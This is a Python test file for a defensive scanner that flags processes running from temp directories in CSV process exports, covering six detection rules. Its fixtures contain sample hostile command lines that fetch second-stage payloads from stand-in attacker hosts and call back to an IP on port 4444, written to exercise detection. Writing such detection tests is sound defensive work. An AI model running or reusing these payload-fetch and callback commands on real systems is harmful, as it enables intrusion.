"""Tests for the Security Engine and Detection Rules — run against REAL
temp CSV files written to disk during the test (real csv.DictWriter, real
csv.DictReader, real ExecutablePath temp-directory checks, real
ParentProcessId cross-row correlation; nothing mocked)."""
import csv
import os
import tempfile
import shutil
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app.security_engine import ScanEngine, TEMP_DIRECTORY_PATTERNS, is_temp_path, is_temp_adjacent_path
from app.detection_rules import (
    rule_active_execution_from_temp,
    rule_random_named_temp_executable,
    rule_multiple_temp_children_same_parent,
    rule_temp_execution_with_network_indicator,
    rule_temp_adjacent_location,
    rule_unrecognized_export_format,
    ALL_RULES,
)

FIELDS = ["Name", "CommandLine", "ProcessId", "ParentProcessId", "ExecutablePath", "User", "CreationDate"]


def _write_csv(path, rows):
    with open(path, "w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=FIELDS)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def _row(name, pid, ppid, exe="", cmd="", user="", created=""):
    return {
        "Name": name,
        "CommandLine": cmd,
        "ProcessId": str(pid),
        "ParentProcessId": str(ppid),
        "ExecutablePath": exe,
        "User": user,
        "CreationDate": created,
    }


# ---------------------------------------------------------------------------
# Rule-level unit tests (pure functions, real row dicts, no filesystem)
# ---------------------------------------------------------------------------

def test_temp_path_matches_windows_appdata_local_temp():
    assert is_temp_path(r"C:\Users\bob\AppData\Local\Temp\a8f3c9d2e1.exe") == "\\AppData\\Local\\Temp\\"


def test_temp_path_matches_unix_tmp():
    assert is_temp_path("/tmp/payload") == "/tmp/"


def test_temp_path_matches_dev_shm():
    assert is_temp_path("/dev/shm/loader") == "/dev/shm/"


def test_temp_path_does_not_match_normal_program_files():
    assert is_temp_path(r"C:\Program Files\Vendor\app.exe") is None


def test_temp_adjacent_matches_fonts_folder():
    assert is_temp_adjacent_path(r"C:\Windows\Fonts\evil.exe") == "\\Windows\\Fonts\\"


def test_active_execution_from_temp_flags_temp_row():
    row = _row("update.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\update.exe")
    result = rule_active_execution_from_temp(row)
    assert result is not None
    assert result["rule_id"] == "TDE-001"
    assert result["severity"] == "high"


def test_active_execution_from_temp_ignores_normal_path():
    row = _row("chrome.exe", 100, 50, exe=r"C:\Program Files\Google\Chrome\chrome.exe")
    assert rule_active_execution_from_temp(row) is None


def test_random_named_temp_executable_flags_hex_name():
    row = _row("a8f3c9d2e1.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\a8f3c9d2e1.exe")
    result = rule_random_named_temp_executable(row)
    assert result is not None
    assert result["rule_id"] == "TDE-002"
    assert result["severity"] == "medium"


def test_random_named_temp_executable_ignores_dictionary_name():
    row = _row("installer.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\installer.exe")
    assert rule_random_named_temp_executable(row) is None


def test_random_named_temp_executable_ignores_non_temp_path():
    row = _row("a8f3c9d2e1.exe", 100, 50, exe=r"C:\Program Files\a8f3c9d2e1.exe")
    assert rule_random_named_temp_executable(row) is None


def test_multiple_temp_children_flags_when_two_or_more_siblings():
    child = _row("c1.exe", 201, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c1.exe")
    sibling = _row("c2.exe", 202, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c2.exe")
    result = rule_multiple_temp_children_same_parent(child, [child, sibling])
    assert result is not None
    assert result["rule_id"] == "TDE-003"
    assert result["severity"] == "medium"


def test_multiple_temp_children_not_flagged_with_single_sibling():
    child = _row("c1.exe", 201, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c1.exe")
    assert rule_multiple_temp_children_same_parent(child, [child]) is None


def test_temp_execution_with_network_indicator_flags_url():
    row = _row("loader.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\loader.exe",
               cmd="loader.exe --url http://evil.example.com/payload.bin")
    result = rule_temp_execution_with_network_indicator(row)
    assert result is not None
    assert result["rule_id"] == "TDE-004"
    assert result["severity"] == "low"


def test_temp_execution_with_network_indicator_flags_ip_literal():
    row = _row("loader.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\loader.exe",
               cmd="loader.exe -c 203.0.113.55:4444")
    result = rule_temp_execution_with_network_indicator(row)
    assert result is not None
    assert result["rule_id"] == "TDE-004"


def test_temp_execution_with_network_indicator_ignores_clean_cmdline():
    row = _row("loader.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\loader.exe", cmd="loader.exe --silent")
    assert rule_temp_execution_with_network_indicator(row) is None


def test_temp_adjacent_location_flags_fonts_folder():
    row = _row("x.exe", 100, 50, exe=r"C:\Windows\Fonts\x.exe")
    result = rule_temp_adjacent_location(row)
    assert result is not None
    assert result["rule_id"] == "TDE-005"
    assert result["severity"] == "low"


def test_temp_adjacent_location_ignores_primary_temp_path():
    row = _row("x.exe", 100, 50, exe=r"C:\Users\bob\AppData\Local\Temp\x.exe")
    assert rule_temp_adjacent_location(row) is None


def test_unrecognized_export_format_flags_missing_columns():
    result = rule_unrecognized_export_format("/tmp/bad.csv", {"Name", "PID"})
    assert result is not None
    assert result["rule_id"] == "TDE-006"


def test_temp_directory_patterns_bundle_covers_windows_and_unix():
    assert "/tmp/" in TEMP_DIRECTORY_PATTERNS
    assert "/var/tmp/" in TEMP_DIRECTORY_PATTERNS
    assert "/dev/shm/" in TEMP_DIRECTORY_PATTERNS
    assert "\\Windows\\Temp\\" in TEMP_DIRECTORY_PATTERNS
    assert len(TEMP_DIRECTORY_PATTERNS) >= 9


def test_all_rules_list_has_six_entries():
    assert len(ALL_RULES) == 6


# ---------------------------------------------------------------------------
# Engine-level tests: real CSV files on disk, real ScanEngine.run()
# ---------------------------------------------------------------------------

def test_engine_detects_active_execution_and_random_name_from_temp():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "procs.csv")
        _write_csv(csv_path, [
            _row("a8f3c9d2e1.exe", 4100, 4000,
                 exe=r"C:\Users\bob\AppData\Local\Temp\a8f3c9d2e1.exe",
                 cmd="a8f3c9d2e1.exe"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "TDE-001" in rule_ids
        assert "TDE-002" in rule_ids
        assert result["files_scanned"] == 1
        assert result["errors_count"] == 0

        active_finding = next(f for f in result["findings"] if f["rule_id"] == "TDE-001")
        assert "AppData" in active_finding["permissions_octal"]
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_multiple_temp_children_same_parent():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "procs.csv")
        _write_csv(csv_path, [
            _row("c1.exe", 201, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c1.exe"),
            _row("c2.exe", 202, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c2.exe"),
            _row("c3.exe", 203, 900, exe=r"C:\Users\bob\AppData\Local\Temp\c3.exe"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "TDE-003" in rule_ids
        tde003_findings = [f for f in result["findings"] if f["rule_id"] == "TDE-003"]
        assert len(tde003_findings) == 3
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_temp_execution_with_embedded_url():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "procs.csv")
        _write_csv(csv_path, [
            _row("loader.exe", 500, 400,
                 exe=r"C:\Users\bob\AppData\Local\Temp\loader.exe",
                 cmd="loader.exe --fetch http://malicious.example.com/stage2.bin"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "TDE-004" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_does_not_flag_processes_outside_temp():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "procs.csv")
        _write_csv(csv_path, [
            _row("chrome.exe", 700, 650, exe=r"C:\Program Files\Google\Chrome\chrome.exe"),
            _row("explorer.exe", 650, 4, exe=r"C:\Windows\explorer.exe"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        assert result["findings"] == []
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_walks_directory_for_csv_files():
    tmpdir = tempfile.mkdtemp()
    try:
        subdir = os.path.join(tmpdir, "exports")
        os.mkdir(subdir)
        csv_path = os.path.join(subdir, "host1.csv")
        _write_csv(csv_path, [_row("explorer.exe", 700, 650, exe=r"C:\Windows\explorer.exe")])
        with open(os.path.join(subdir, "notes.txt"), "w") as fh:
            fh.write("not a csv")

        engine = ScanEngine(tmpdir, max_depth=3)
        result = engine.run()

        assert result["files_scanned"] == 1
        assert result["dirs_scanned"] >= 2
    finally:
        shutil.rmtree(tmpdir)


def test_engine_flags_unrecognized_export_format():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "bad_export.csv")
        with open(csv_path, "w", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(["Name", "PID"])  # missing ExecutablePath
            writer.writerow(["lsass.exe", "500"])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "TDE-006" in rule_ids
        assert result["files_scanned"] == 1
    finally:
        shutil.rmtree(tmpdir)


def test_excluded_directories_are_skipped():
    tmpdir = tempfile.mkdtemp()
    try:
        excluded = os.path.join(tmpdir, "excluded")
        os.mkdir(excluded)
        bad_csv = os.path.join(excluded, "bad.csv")
        _write_csv(bad_csv, [_row("a8f3c9d2e1.exe", 500, 400, exe=r"C:\Users\bob\AppData\Local\Temp\a8f3c9d2e1.exe")])

        engine = ScanEngine(tmpdir, max_depth=3, excludes=[excluded])
        result = engine.run()
        assert result["files_scanned"] == 0
        assert result["findings"] == []
    finally:
        shutil.rmtree(tmpdir)
